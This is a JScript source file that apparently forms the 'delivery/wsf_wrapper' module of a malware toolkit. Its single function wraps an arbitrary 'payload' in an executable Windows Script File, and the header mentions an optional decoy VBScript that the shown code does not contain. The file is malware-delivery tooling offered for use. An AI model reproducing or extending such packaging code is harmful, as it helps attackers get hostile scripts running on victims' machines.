// chunk: delivery/wsf_wrapper
// depends: core/file_ops
// provides: create_wsf
// format: jscript
// description: Wraps JScript payload in a WSF file with optional decoy VBScript

function create_wsf(jsCode, wsfPath) {
    var fso = WScript.CreateObject("Scripting.FileSystemObject");
    var f = fso.CreateTextFile(wsfPath, true);
    f.WriteLine('<?xml version="1.0"?>');
    f.WriteLine('<package>');
    f.WriteLine('  <job id="main">');
    f.WriteLine('    <script language="JScript">');
    f.WriteLine('      <![CDATA[');
    f.Write(jsCode);
    f.WriteLine('      ]]>');
    f.WriteLine('    </script>');
    f.WriteLine('  </job>');
    f.WriteLine('</package>');
    f.Close();
}
